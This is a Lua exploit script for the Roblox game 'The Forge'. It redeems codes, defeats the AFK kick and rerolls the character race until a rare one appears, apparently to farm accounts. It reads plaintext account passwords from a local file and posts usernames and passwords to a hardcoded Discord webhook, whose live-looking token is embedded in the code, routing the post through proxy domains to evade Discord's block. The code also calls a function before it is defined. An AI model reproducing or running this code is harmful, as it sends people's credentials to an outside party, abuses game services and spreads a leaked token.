--[[
    THE FORGE - AUTO REROLL & CODE REDEEMER
    Direct API Version (No GUI navigation needed!)
    
    Uses direct RemoteFunction calls for instant execution
]]

-- CONFIGURATION
local CODES = {
    "RAVEN",
    "HAPPYNEWYEAR"
}

-- MYTHIC = Stop immediately (rarest)
local MYTHIC_RACES = {
    "Archangel", "Demon", "Angel"
}

-- LEGENDARY = Keep spinning if spins remain
local LEGENDARY_RACES = {
    "Felynx", "Golem", "Dragonborn", "Minotaur"
}

local MAX_REROLLS = 100

-- WEBHOOK CONFIG
-- Discord blocked direct Roblox requests, so we use a proxy
-- Original: https://discord.com/api/webhooks/...
-- Proxy replaces "discord.com" with a proxy domain
local WEBHOOK_URL_ORIGINAL = "https://discord.com/api/webhooks/1457625547801886875/Lm5iwIsEoIOaiEJ2FuHQdR9fHsehYCYZNOax_zrz9GgZSEv5299miWPqGlK-xvZsQb-m"

-- Try different proxy URLs (some may work, some may not)
local WEBHOOK_PROXIES = {
    WEBHOOK_URL_ORIGINAL:gsub("discord.com", "webhook.lewisakura.moe"),
    WEBHOOK_URL_ORIGINAL:gsub("discord.com", "hooks.hyra.io"),
    WEBHOOK_URL_ORIGINAL:gsub("discord.com", "canary.discord.com"),
    WEBHOOK_URL_ORIGINAL -- Try original as fallback
}

-- SERVICES & REMOTES
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local VirtualUser = game:GetService("VirtualUser")

local Lp = Players.LocalPlayer
local PlayerGui = Lp:WaitForChild("PlayerGui")

-- Get the RemoteFunctions
local Knit = ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services")
local CodeService = Knit:WaitForChild("CodeService"):WaitForChild("RF")
local RaceService = Knit:WaitForChild("RaceService"):WaitForChild("RF")

local RedeemCodeRF = CodeService:WaitForChild("RedeemCode")
local RerollRF = RaceService:WaitForChild("Reroll")

-- Anti-AFK
Players.LocalPlayer.Idled:Connect(function()
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new())
end)

-- HELPER FUNCTIONS
local function getPassword()
    if not readfile then return "???" end
    local success, content = pcall(function() return readfile("accounts.txt") end)
    if not success then return "check_main_list" end
    
    for _, line in ipairs(content:split("\n")) do
        if line:find(Lp.Name) then
            local parts = line:split(":")
            if parts[2] then return parts[2]:gsub("%s+", "") end
        end
    end
    return "not_found"
end

local function notify(msg)
    print("[Webhook] Sending...")
    
    local data = HttpService:JSONEncode({
        content = msg,
        username = "The Forge Bot"
    })
    
    local headers = {["Content-Type"] = "application/json"}
    local sent = false
    
    -- Try each proxy URL
    for i, webhookUrl in ipairs(WEBHOOK_PROXIES) do
        if sent then break end
        
        print("[Webhook] Trying proxy " .. i .. "...")
        
        -- Try request function
        local ok = pcall(function()
            local response = request({
                Url = webhookUrl,
                Method = "POST",
                Headers = headers,
                Body = data
            })
            if response and (response.StatusCode == 200 or response.StatusCode == 204) then
                sent = true
            end
        end)
        
        if ok then
            sent = true
            print("[Webhook] Proxy " .. i .. " worked!")
            break
        end
        
        -- Try http_request as fallback
        if not sent then
            ok = pcall(function()
                http_request({
                    Url = webhookUrl,
                    Method = "POST",
                    Headers = headers,
                    Body = data
                })
            end)
            if ok then
                sent = true
                print("[Webhook] http_request worked!")
                break
            end
        end
    end
    
    -- Wait to ensure request completes
    task.wait(3)
    
    if sent then
        print("[Webhook] Sent successfully!")
    else
        print("[Webhook] All proxies failed - webhook may be blocked")
    end
    
    return sent
end

-- Safe leave function - sends webhook first, waits, then kicks
local function safeLeave(reason, race, rollCount)
    local pass = getPassword()
    saveAccount("GodlyAccounts.txt", race)
    
    -- Send webhook and wait
    local msg = "@everyone **" .. reason .. "**\n```\nUsername: " .. Lp.Name .. "\nPassword: " .. pass .. "\nRace: " .. race .. "\nRolls: " .. rollCount .. "\n```"
    notify(msg)
    
    -- Extra wait to be sure
    task.wait(2)
    
    -- Now kick
    Lp:Kick(reason .. ": " .. race)
end

local function saveAccount(filename, race)
    if not writefile then return end
    local pass = getPassword()
    local content = Lp.Name .. ":" .. pass .. " | Race: " .. race .. "\n"
    
    pcall(function()
        local old = readfile(filename) or ""
        writefile(filename, old .. content)
    end)
end

local function getCurrentRace()
    -- Try to read from PlayerGui
    local sell = PlayerGui:FindFirstChild("Sell")
    if sell then
        local raceUI = sell:FindFirstChild("RaceUI")
        if raceUI then
            local currentRace = raceUI:FindFirstChild("CurrentRace")
            if currentRace and currentRace:IsA("TextLabel") then
                local text = currentRace.Text
                -- Strip HTML tags like <fontcolor="...">Race</fontcolor>
                text = text:gsub("<[^>]+>", "")
                -- Remove "Current Race:" prefix and whitespace
                text = text:gsub("Current Race:", ""):gsub("%s+", "")
                return text
            end
        end
    end
    return "Unknown"
end

-- Check if race is mythic (use contains to be safe)
local function isMythic(race)
    for _, mythic in ipairs(MYTHIC_RACES) do
        if race:lower():find(mythic:lower()) then
            return true, mythic
        end
    end
    return false, nil
end

-- Check if race is legendary (use contains to be safe)
local function isLegendary(race)
    for _, legendary in ipairs(LEGENDARY_RACES) do
        if race:lower():find(legendary:lower()) then
            return true, legendary
        end
    end
    return false, nil
end

local function getSpinsLeft()
    -- Search for "Spins: X" in the RaceUI
    local sell = PlayerGui:FindFirstChild("Sell")
    if sell then
        local raceUI = sell:FindFirstChild("RaceUI")
        if raceUI then
            for _, v in pairs(raceUI:GetDescendants()) do
                if v:IsA("TextLabel") then
                    local text = v.Text
                    local spins = text:match("Spins:%s*(%d+)")
                    if spins then
                        return tonumber(spins)
                    end
                end
            end
        end
    end
    return -1 -- Unknown
end

-- MAIN AUTOMATION
task.spawn(function()
    if not game:IsLoaded() then game.Loaded:Wait() end
    task.wait(5)
    
    print("================================================")
    print("   THE FORGE - DIRECT API AUTOMATION")
    print("================================================")
    print("")
    
    -- 1. REDEEM CODES
    print("[1/2] Redeeming Codes...")
    
    for _, code in ipairs(CODES) do
        print("  Redeeming: " .. code)
        
        local success, result = pcall(function()
            return RedeemCodeRF:InvokeServer(code)
        end)
        
        if success then
            print("    Result: " .. tostring(result))
        else
            print("    Error: " .. tostring(result))
        end
        
        task.wait(1)
    end
    
    print("")
    print("[2/2] Starting Auto Reroll...")
    print("")
    
    -- 2. AUTO REROLL LOOP
    local rerolls = 0
    local bestLegendary = nil
    
    while rerolls < MAX_REROLLS do
        rerolls = rerolls + 1
        
        -- Check spins BEFORE attempting reroll
        local spinsLeft = getSpinsLeft()
        if spinsLeft == 0 then
            print("")
            print("NO SPINS LEFT! (Detected: 0)")
            
            local currentRace = getCurrentRace()
            if bestLegendary then
                local pass = getPassword()
                saveAccount("GodlyAccounts.txt", bestLegendary)
                notify("@everyone **LEGENDARY RACE** (No spins)\n```\nUsername: " .. Lp.Name .. "\nPassword: " .. pass .. "\nRace: " .. bestLegendary .. "\nRolls: " .. rerolls .. "\n```")
                Lp:Kick("LEGENDARY: " .. bestLegendary)
            else
                saveAccount("TrashAccounts.txt", currentRace)
                Lp:Kick("No spins - " .. currentRace)
            end
            return
        end
        
        -- Get current race
        local currentRace = getCurrentRace()
        print(string.format("[Roll %d] Race: %s | Spins: %s", rerolls, currentRace, tostring(spinsLeft)))
        
        -- Check for MYTHIC (instant win - STOP IMMEDIATELY!)
        local foundMythic, mythicName = isMythic(currentRace)
        if foundMythic then
            print("")
            print("!!! MYTHIC RACE FOUND: " .. mythicName .. " !!!")
            print("!!! STOPPING IMMEDIATELY !!!")
            print("")
            
            -- Use safeLeave - webhook first, then kick
            safeLeave("MYTHIC RACE FOUND", mythicName, rerolls)
            return
        end
        
        -- Check for LEGENDARY
        local foundLegendary, legendaryName = isLegendary(currentRace)
        if foundLegendary then
            print("  Found Legendary: " .. legendaryName .. ", continuing for Mythic...")
            bestLegendary = legendaryName
        end
        
        -- Reroll NOW (after all checks)
        local success, result = pcall(function()
            return RerollRF:InvokeServer()
        end)
        
        -- Wait for reroll animation AND UI to update
        task.wait(2)
        
        -- Check return value (might be false if no spins)
        if success then
            -- If result is false or contains error info, we might be out of spins
            if result == false then
                print("  Reroll returned false - likely out of spins")
                print("")
                print("NO SPINS LEFT!")
                
                if bestLegendary then
                    local pass = getPassword()
                    saveAccount("GodlyAccounts.txt", bestLegendary)
                    notify("@everyone **LEGENDARY RACE** (No spins)\n```\nUsername: " .. Lp.Name .. "\nPassword: " .. pass .. "\nRace: " .. bestLegendary .. "\nRolls: " .. rerolls .. "\n```")
                    Lp:Kick("LEGENDARY: " .. bestLegendary)
                else
                    saveAccount("TrashAccounts.txt", currentRace)
                    Lp:Kick("No spins - " .. currentRace)
                end
                return
            end
        else
            print("  Reroll error: " .. tostring(result))
            
            -- Check if error mentions spins
            local errStr = tostring(result):lower()
            if errStr:find("spin") or errStr:find("enough") or errStr:find("cannot") then
                print("")
                print("NO SPINS LEFT! (Error detected)")
                
                if bestLegendary then
                    safeLeave("LEGENDARY RACE", bestLegendary, rerolls)
                else
                    saveAccount("TrashAccounts.txt", currentRace)
                    Lp:Kick("No spins - " .. currentRace)
                end
                return
            end
        end
        
        -- Loop continues - wait already happened above after reroll
    end
    
    -- Max rerolls reached
    print("")
    print("MAX REROLLS REACHED!")
    
    local finalRace = getCurrentRace()
    
    if bestLegendary then
        local pass = getPassword()
        saveAccount("GodlyAccounts.txt", bestLegendary)
        notify("@everyone **LEGENDARY RACE** (Max rolls)\n```\nUsername: " .. Lp.Name .. "\nPassword: " .. pass .. "\nRace: " .. bestLegendary .. "\nRolls: " .. rerolls .. "\n```")
        Lp:Kick("LEGENDARY: " .. bestLegendary)
    else
        saveAccount("TrashAccounts.txt", finalRace)
        Lp:Kick("Max rolls - " .. finalRace)
    end
    
    print("")
    print("================================================")
    print("   AUTOMATION COMPLETE")
    print("================================================")
end)
